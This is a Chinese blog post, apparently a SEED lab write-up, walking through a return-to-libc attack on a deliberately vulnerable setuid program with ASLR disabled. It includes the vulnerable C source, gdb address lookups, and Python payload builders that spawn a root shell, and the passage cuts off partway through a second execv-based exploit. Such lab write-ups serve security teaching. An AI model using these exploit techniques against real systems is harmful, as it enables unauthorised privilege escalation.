@@ -1,0 +1,1683 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="SEEDLAB_RETLIB, Yssx&#39;s Blog">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>SEEDLAB_RETLIB | Yssx&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Yssx&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Yssx&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/Yssx-g" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/Yssx-g" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">SEEDLAB_RETLIB</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/SEED-LAB/">
+                                <span class="chip bg-color">SEED_LAB</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/" class="post-category">
+                                软件安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2026-05-21
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.3k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    10 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="Return-to-libc攻击实验"><a href="#Return-to-libc攻击实验" class="headerlink" title="Return-to-libc攻击实验"></a>Return-to-libc攻击实验</h1><p>上篇文章我们完成了对ASLR的对抗，本文则对noexecstack，堆栈不可执行进行攻击示范，我们将利用已有代码片段，构造ROP链，实现攻击。</p>
+<p>首先我们要关闭ASLR <code>sudo sysctl -w kernel.randomize_va_space=0</code>，执行实验目录下的makefile，将retlib.c按 <code>-m32 -fno-stack-protector -z noexecstack</code>进行编译，并设置为set_uid程序，方便攻击的后续提权。</p>
+<p>在前三个任务中，我们将&#x2F;bin&#x2F;sh链接为&#x2F;bin&#x2F;zsh，以此绕过Ubuntu的原生保护，任务四将回头解决该问题</p>
+<h2 id="任务一：查找libc函数地址"><a href="#任务一：查找libc函数地址" class="headerlink" title="任务一：查找libc函数地址"></a>任务一：查找libc函数地址</h2><p>首先给出漏洞代码如下，并未发现有system或execv等命令执行函数。为获得shell，我们应该在内存中的共享库进行查找，获得对应的函数地址</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">BUF_SIZE</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUF_SIZE</span> <span class="token expression"><span class="token number">12</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+
+<span class="token keyword">int</span> <span class="token function">bof</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span>BUF_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>framep<span class="token punctuation">;</span>
+
+    <span class="token comment">// Copy ebp into framep</span>
+    <span class="token keyword">asm</span><span class="token punctuation">(</span><span class="token string">"movl %%ebp, %0"</span> <span class="token operator">:</span> <span class="token string">"=r"</span> <span class="token punctuation">(</span>framep<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  
+
+    <span class="token comment">/* print out information for experiment purpose */</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Address of buffer[] inside bof():  0x%.8x\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Frame Pointer value inside bof():  0x%.8x\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span><span class="token punctuation">)</span>framep<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>   
+
+    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">foo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">static</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Function foo() is invoked %d times\n"</span><span class="token punctuation">,</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+   <span class="token keyword">char</span> input<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+   FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>
+
+   badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token keyword">int</span> length <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span>input<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Address of input[] inside main():  0x%x\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span> input<span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Input size: %d\n"</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token function">bof</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(^_^)(^_^) Returned Properly (^_^)(^_^)\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+   <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="ldd查找"><a href="#ldd查找" class="headerlink" title="ldd查找"></a>ldd查找</h3><p>我们可以先使用ldd分析程序的动态链接情况，得到程序共享库信息以及加载基址</p>
+<p><img src="/2026/05/21/seedlab-retlib/1779339780240.png"></p>
+<p>接下来我们可以在共享库进行函数偏移的查询，计算得到system函数地址为 <code>0xf7dc3000+0x41780=0xF7E04780</code>，同理exit函数地址为 <code>0xf7dc3000+0x340c0=0xF7df70c0</code></p>
+<p><img src="/2026/05/21/seedlab-retlib/1779340172338.png" alt="1779340172338"></p>
+<p>但要注意，我们的retlib为Set_uid程序，动态库的加载地址可能与当前shell查询得到的不太一致，因此导致地址会有些许偏差</p>
+<h3 id="gdb查找"><a href="#gdb查找" class="headerlink" title="gdb查找"></a>gdb查找</h3><p>我们同样可以直接使用gdb进行动态的地址查询，由于我们关闭了ASLR，每次进入程序时对应的函数地址也应当一致。</p>
+<p>首先输入如下命令,得到gdb中的函数地址结果如图，可以看到，确实与上文推算得到的函数地址有0x5000的偏差</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb <span class="token parameter variable">-q</span> retlib
+b main
+r
+p system
+p <span class="token builtin class-name">exit</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2026/05/21/seedlab-retlib/1779340633733.png"></p>
+<h2 id="任务二：将”-bin-sh”放入内存"><a href="#任务二：将”-bin-sh”放入内存" class="headerlink" title="任务二：将”&#x2F;bin&#x2F;sh”放入内存"></a>任务二：将”&#x2F;bin&#x2F;sh”放入内存</h2><p>为使用system获取shell，我们必须有诸如”&#x2F;bin&#x2F;sh”的参数字符串。自然，我们可以通过ASCII码方式将该字符串构造在程序内部，但此处我们选择一个更巧妙的方法，利用环境变量将字符串传入内存中。</p>
+<p>首先，我们得清楚shell是如何执行命令的——<code>execve(&quot;your_instruction&quot;, argv, environ);</code>,这也正是main函数参数列表 <code>int main(int argc,char* argv[],char* env[])</code>的由来。因此环境变量是作为参数在执行命令时被压入栈中的。所以我们完全可以通过在shell中 <code>export MYSHELL=/bin/sh</code>来将该字符串放入程序中</p>
+<p>由于shell作为父进程的栈帧不变，每次执行命令均通过execve调用进行。因此我们只需要保证三个参数的长度保持一致，便可通过自定义代码获取指定环境变量在内存中的地址，并且与retlib时的保持一致</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//获取环境变量地址</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+
+<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">char</span> <span class="token operator">*</span>shell <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"MYSHELL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span>shell<span class="token punctuation">)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>shell<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>分别将该段代码放在retlib和prtenv中，观察结果，获取的地址一致，因此该方法确实成功得到了指定字符串的地址</p>
+<p><img src="/2026/05/21/seedlab-retlib/1779341881282.png"><img src="/2026/05/21/seedlab-retlib/1779341891559.png"></p>
+<h2 id="任务三：发起攻击"><a href="#任务三：发起攻击" class="headerlink" title="任务三：发起攻击"></a>任务三：发起攻击</h2><p>我们已知system和exit地址，可直接构造如下payload，其中XYZ分别为对应的offset，具体值可通过.&#x2F;retlib的回显计算</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<span class="token keyword">import</span> sys
+
+<span class="token comment"># Fill content with non-zero values</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0xaa</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+X <span class="token operator">=</span> <span class="token number">0x24</span>
+sh_addr <span class="token operator">=</span> <span class="token number">0xffffd413</span>       <span class="token comment"># The address of "/bin/sh"</span>
+content<span class="token punctuation">[</span>X<span class="token punctuation">:</span>X<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+Y <span class="token operator">=</span> <span class="token number">0x1c</span>
+system_addr <span class="token operator">=</span> <span class="token number">0xf7e09780</span>   <span class="token comment"># The address of system()</span>
+content<span class="token punctuation">[</span>Y<span class="token punctuation">:</span>Y<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+Z <span class="token operator">=</span> <span class="token number">0x20</span>
+exit_addr <span class="token operator">=</span> <span class="token number">0xf7dfc0c0</span>     <span class="token comment"># The address of exit()</span>
+content<span class="token punctuation">[</span>Z<span class="token punctuation">:</span>Z<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># Save content to a file</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+  f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>payload填充后栈结构如下图，先执行system（&#x2F;bin&#x2F;sh），执行完毕以后再调用exit退出</p>
+<p><img src="/2026/05/21/seedlab-retlib/1779349253456.png" alt="栈结构"></p>
+<p>成功获取root权限，攻击成功</p>
+<p><img src="/2026/05/21/seedlab-retlib/1779349460224.png"></p>
+<p>关于攻击变种12，进行简单解释说明。</p>
+<p>1，去除exit以后不影响rootshell的获取，只是退出rootshell后，原程序报段错误，仍能攻击成功</p>
+<p>2，更改程序名长度后，如上节所说，将会挤压环境变量所在的地址，从而导致二程序的&#x2F;bin&#x2F;sh地址发生偏差，攻击不成功</p>
+<h2 id="任务四-对抗原生shell"><a href="#任务四-对抗原生shell" class="headerlink" title="任务四:对抗原生shell"></a>任务四:对抗原生shell</h2><p>首先我们修改回原本的&#x2F;bin&#x2F;dash,此时如果仍按照上节攻击方式进行攻击，会得到如下结果。获取到的shell权限仍为seed，无法进行提权</p>
+<p><img src="/2026/05/21/seedlab-retlib/1779349790707.png"></p>
+<p>但是我们知道，通过-p参数可以保存set_uid的权限不被放弃，因此，我们应该将目光聚焦到可以附带参数的 <code>int execv(const char *pathname, char *const argv[]);</code>上。但注意，execv的参数调用如下图所示。argv[2]必须为4个0，所以我们必须在exploit.py中进行-p的构建。同时鉴于strcpy会被0截断，因此我们要像上篇文章，通过main函数调用构建的argv数组</p>
+<p><img src="/2026/05/21/seedlab-retlib/1779350016835.png"></p>
+<p>由此构建出我们的exploit2.py，通过.&#x2F;retlib得到main函数中input的地址，并在input[100]处构建我们的参数二的数组。</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<span class="token keyword">import</span> sys
+<span class="token comment"># Fill content with non-zero values</span>
+content <span class="token operator">=</span> <span class="token builtin">bytearray</span><span class="token punctuation">(</span><span class="token number">0xaa</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+input_addr<span class="token operator">=</span><span class="token number">0xffffcdb0</span>
+X <span class="token operator">=</span> <span class="token number">0x24</span><span class="token comment">#path_addr</span>
+sh_addr <span class="token operator">=</span> <span class="token number">0xffffd413</span>       <span class="token comment"># The address of "/bin/sh"</span>
+content<span class="token punctuation">[</span>X<span class="token punctuation">:</span>X<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+content<span class="token punctuation">[</span><span class="token number">120</span><span class="token punctuation">:</span><span class="token number">123</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">b"-p\0"</span>
+content<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">:</span><span class="token number">104</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">:</span><span class="token number">108</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>input_addr<span class="token operator">+</span><span class="token number">120</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+content<span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">:</span><span class="token number">112</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span>byteorder<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+
+W <span class="token operator">=</span> <span class="token number">0x28</span><span class="token comment">#argv_addr</span>
+argv_addr <span class="token operator">=</span> input_addr<span class="token operator">+</span><span class="token number">100</span>   
